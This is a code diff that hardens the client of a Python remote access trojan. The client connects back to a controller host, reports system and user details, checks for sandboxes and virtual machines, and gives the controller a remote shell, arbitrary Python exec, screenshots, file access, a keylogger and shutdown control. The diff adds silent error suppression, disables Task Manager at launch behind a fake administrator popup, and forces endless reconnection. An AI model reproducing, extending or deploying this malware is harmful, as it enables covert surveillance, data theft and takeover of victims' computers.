@@ -101,34 +101,42 @@ def remove_from_startup():
 
 
 def server_connect():
-    global objSocket, objEncryptor
-    while True:  # infinite loop until socket can connect
-        try:
-            objSocket = socket.socket()
-            objSocket.connect((strHost, intPort))
-        except socket.error:
-            time.sleep(5)  # wait 5 seconds to try again
-        else:
-            break
+    try:
+        global objSocket, objEncryptor
+        while True:  # infinite loop until socket can connect
+            try:
+                objSocket = socket.socket()
+                objSocket.connect((strHost, intPort))
+            except socket.error:
+                time.sleep(5)  # wait 5 seconds to try again
+            else:
+                break
 
-    arrUserInfo = [socket.gethostname()]
-    strPlatform = f"{platform.system()} {platform.release()}"
-    if detectSandboxie():
-        strPlatform += " (Sandboxie) "
-    if detectVM():
-        strPlatform += " (Virtual Machine) "
-    arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])
+        arrUserInfo = [socket.gethostname()]
+        strPlatform = f"{platform.system()} {platform.release()}"
+        if detectSandboxie():
+            strPlatform += " (Sandboxie) "
+        if detectVM():
+            strPlatform += " (Virtual Machine) "
+        arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])
 
-    objSocket.send(json.dumps(arrUserInfo).encode())
+        objSocket.send(json.dumps(arrUserInfo).encode())
 
-    objEncryptor = Fernet(objSocket.recv(intBuff))
-
+        objEncryptor = Fernet(objSocket.recv(intBuff))
+    except Exception:
+        pass
 
 # function to receive data
-recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
+try:
+    recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
+except Exception:
+    pass
 
 # function to send data
-send = lambda data: objSocket.send(objEncryptor.encrypt(data))
+try:
+    send = lambda data: objSocket.send(objEncryptor.encrypt(data))
+except Exception:
+    pass
 
 if blnMeltFile:
     meltFile()
@@ -181,58 +189,67 @@ def sendall(data):
 
 # vbs message box
 def MessageBox(message):
-    strScript = os.path.join(TMP, "m.vbs")
-    with open(strScript, "w") as objVBS:
-        objVBS.write(
-            f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"'
+    try:
+        strScript = os.path.join(TMP, "m.vbs")
+        with open(strScript, "w") as objVBS:
+            objVBS.write(
+                f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"'
+            )
+        subprocess.Popen(
+            ["cscript", strScript],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            shell=True,
         )
-    subprocess.Popen(
-        ["cscript", strScript],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        stdin=subprocess.PIPE,
-        shell=True,
-    )
+    except Exception:
+        send(b"Error desplaying message")
 
 
 def screenshot():
-    # Take Screenshot
-    objImage = pyscreeze.screenshot()
-    # Create BytesIO Object as objBytes
-    with BytesIO() as objBytes:
-        # Save Screenshot into BytesIO Object
-        objImage.save(objBytes, format="PNG")
-        # Get BytesIO Object Data as bytes
-        objPic = objBytes.getvalue()
+    try:
+        # Take Screenshot
+        objImage = pyscreeze.screenshot()
+        # Create BytesIO Object as objBytes
+        with BytesIO() as objBytes:
+            # Save Screenshot into BytesIO Object
+            objImage.save(objBytes, format="PNG")
+            # Get BytesIO Object Data as bytes
+            objPic = objBytes.getvalue()
 
-    sendall(objPic)
+        sendall(objPic)
+    except Exception:
+        send(b"Error taking screenshot")
 
 
 def file_browser():
-    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
-    arrRawDrives = arrRawDrives.split("\000")[:-1]
+    try:
+        arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
+        arrRawDrives = arrRawDrives.split("\000")[:-1]
 
-    strDrives = ""
-    for drive in arrRawDrives:  # get proper view and place array into string
-        strDrives += drive.replace("\\", "") + "\n"
-    send(strDrives.encode())
+        strDrives = ""
+        for drive in arrRawDrives:  # get proper view and place array into string
+            strDrives += drive.replace("\\", "") + "\n"
+        send(strDrives.encode())
 
-    strDir = recv(intBuff).decode()
+        strDir = recv(intBuff).decode()
 
-    if os.path.isdir(strDir):
-        if strDir[:-1] != "\\" or strDir[:-1] != "/":
-            strDir += "\\"
-        arrFiles = os.listdir(strDir)
+        if os.path.isdir(strDir):
+            if strDir[:-1] != "\\" or strDir[:-1] != "/":
+                strDir += "\\"
+            arrFiles = os.listdir(strDir)
 
-        strFiles = ""
-        for file in arrFiles:
-            strFiles += f"{file}\n"
+            strFiles = ""
+            for file in arrFiles:
+                strFiles += f"{file}\n"
 
-        sendall(strFiles.encode())
+            sendall(strFiles.encode())
 
-    else:  # if the user entered an invalid directory
-        send(b"Invalid Directory!")
-        return
+        else:  # if the user entered an invalid directory
+            send(b"Invalid Directory!")
+            return
+    except Exception:
+        send(b"Error while trying to browse the directory")
 
 
 def upload(data):
@@ -258,94 +275,105 @@ def receive(data):
 
 
 def lock():
-    ctypes.windll.user32.LockWorkStation()  # lock pc
+    try:
+        ctypes.windll.user32.LockWorkStation()  # lock pc
+    except Exception:
+        send(b"unable to execute command")
 
 
 def shutdown(shutdowntype):
-    command = f"shutdown {shutdowntype} -f -t 30"
-    subprocess.Popen(
-        command.split(),
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        stdin=subprocess.PIPE,
-        shell=True,
-    )
-    objSocket.close()  # close connection and exit
-    sys.exit(0)
-
+    try:
+        command = f"shutdown {shutdowntype} -f -t 30"
+        subprocess.Popen(
+            command.split(),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            shell=True,
+        )
+        objSocket.close()  # close connection and exit
+        sys.exit(0)
+    except Exception:
+        send(b"unable to execute command")
 
 def command_shell():
-    strCurrentDir = os.getcwd()
-    send(os.getcwdb())
-    bytData = b""
+    try:
+        strCurrentDir = os.getcwd()
+        send(os.getcwdb())
+        bytData = b""
 
-    while True:
-        strData = recv(intBuff).decode()
+        while True:
+            strData = recv(intBuff).decode()
 
-        if strData == "goback":
-            os.chdir(strCurrentDir)  # change directory back to original
-            break
+            if strData == "goback":
+                os.chdir(strCurrentDir)  # change directory back to original
+                break
 
-        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
-            objCommand = subprocess.Popen(
-                strData + " & cd",
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-                shell=True,
-            )
-            if objCommand.stderr.read().decode() == "":  # if there is no error
+            elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
+                objCommand = subprocess.Popen(
+                    strData + " & cd",
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    shell=True,
+                )
+                if objCommand.stderr.read().decode() == "":  # if there is no error
+                    strOutput = (
+                        (objCommand.stdout.read()).decode().splitlines()[0]
+                    )  # decode and remove new line
+                    os.chdir(strOutput)  # change directory
+
+                    bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
+
+            elif len(strData) > 0:
+                objCommand = subprocess.Popen(
+                    strData,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    shell=True,
+                )
                 strOutput = (
-                    (objCommand.stdout.read()).decode().splitlines()[0]
-                )  # decode and remove new line
-                os.chdir(strOutput)  # change directory
+                    objCommand.stdout.read() + objCommand.stderr.read()
+                )  # since cmd uses bytes, decode it
+                bytData = strOutput + b"\n" + os.getcwdb() + b">"
+            else:
+                bytData = b"Error!"
 
-                bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
-
-        elif len(strData) > 0:
-            objCommand = subprocess.Popen(
-                strData,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-                shell=True,
-            )
-            strOutput = (
-                objCommand.stdout.read() + objCommand.stderr.read()
-            )  # since cmd uses bytes, decode it
-            bytData = strOutput + b"\n" + os.getcwdb() + b">"
-        else:
-            bytData = b"Error!"
-
-        sendall(bytData)  # send output
+            sendall(bytData)  # send output
+    except Exception:
+        send(b"unable to execute command")
 
 
 def python_interpreter():
-    send(b"received")
-    while True:
-        strCommand = recv(intBuff).decode()
-        if strCommand == "exit":
-            send(b"exiting")
-            break
-        old_stdout = sys.stdout
-        redirected_output = sys.stdout = StringIO()
-        try:
-            exec(strCommand)
-            print()
-            strError = None
-        except Exception as e:
-            strError = f"{e.__class__.__name__}: "
+    try:
+        send(b"received")
+        while True:
+            strCommand = recv(intBuff).decode()
+            if strCommand == "exit":
+                send(b"exiting")
+                break
+            old_stdout = sys.stdout
+            redirected_output = sys.stdout = StringIO()
             try:
-                strError += f"{e.args[0]}"
-            except:
-                pass
-        finally:
-            sys.stdout = old_stdout
+                exec(strCommand)
+                print()
+                strError = None
+            except Exception as e:
+                strError = f"{e.__class__.__name__}: "
+                try:
+                    strError += f"{e.args[0]}"
+                except:
+                    pass
+            finally:
+                sys.stdout = old_stdout
 
-        if strError:
-            sendall(strError.encode())
-        else:
-            sendall(redirected_output.getvalue().encode())
+            if strError:
+                sendall(strError.encode())
+            else:
+                sendall(redirected_output.getvalue().encode())
+    except Exception:
+        send(b"unable to execute command")
 
 
 def vbs_block_process(process, popup=False):
@@ -387,31 +415,34 @@ def vbs_block_process(process, popup=False):
 
 
 def disable_taskmgr():
-    global blnDisabled
-    if not blnDisabled:  # if task manager is already disabled, enable it
-        send(b"Enabling ...")
+    try:
+        global blnDisabled
+        if not blnDisabled:  # if task manager is already disabled, enable it
+            send(b"Enabling ...")
 
-        subprocess.Popen(
-            ["taskkill", "/f", "/im", "cscript.exe"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE,
-            shell=True,
-        )
+            subprocess.Popen(
+                ["taskkill", "/f", "/im", "cscript.exe"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                shell=True,
+            )
 
-        blnDisabled = True
-    else:
-        send(b"Disabling ...")
+            blnDisabled = True
+        else:
+            send(b"Disabling ...")
 
-        popup = [
-            "Task Manager has been disabled by your administrator",
-            "Task Manager",
-            "3",
-            "16",
-        ]
+            popup = [
+                "Task Manager has been disabled by your administrator",
+                "Task Manager",
+                "3",
+                "16",
+            ]
 
-        vbs_block_process("taskmgr.exe", popup=popup)
-        blnDisabled = False
+            vbs_block_process("taskmgr.exe", popup=popup)
+            blnDisabled = False
+    except Exception:
+        send(b"unable to disable task manager")
 
 
 def keylogger(option):
@@ -446,22 +477,27 @@ def keylogger(option):
 
 
 def run_command(command):
-    bytLogOutput = b"\n"
+    try:
+        bytLogOutput = b"\n"
 
-    if len(command) > 0:
-        objCommand = subprocess.Popen(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE,
-            shell=True,
-        )
-        bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
-    else:
-        bytLogOutput += b"Error!"
+        if len(command) > 0:
+            objCommand = subprocess.Popen(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                shell=True,
+            )
+            bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
+        else:
+            bytLogOutput += b"Error!"
 
-    sendall(bytLogOutput)
+        sendall(bytLogOutput)
+    except Exception:
+        send(b"unable to execute command")
 
+
+disable_taskmgr();
 
 while True:
     try:
@@ -471,7 +507,8 @@ while True:
 
             if strData == "exit":
                 objSocket.close()
-                sys.exit(0)
+                # sys.exit(0)
+                break
             elif strData[:3] == "msg":
                 MessageBox(strData[3:])
             elif strData == "startup":
@@ -513,6 +550,8 @@ while True:
     except socket.error:  # if the server closes without warning
         objSocket.close()
         del objSocket
+        # server_connect()
+    finally:
         server_connect()
 
 # eof
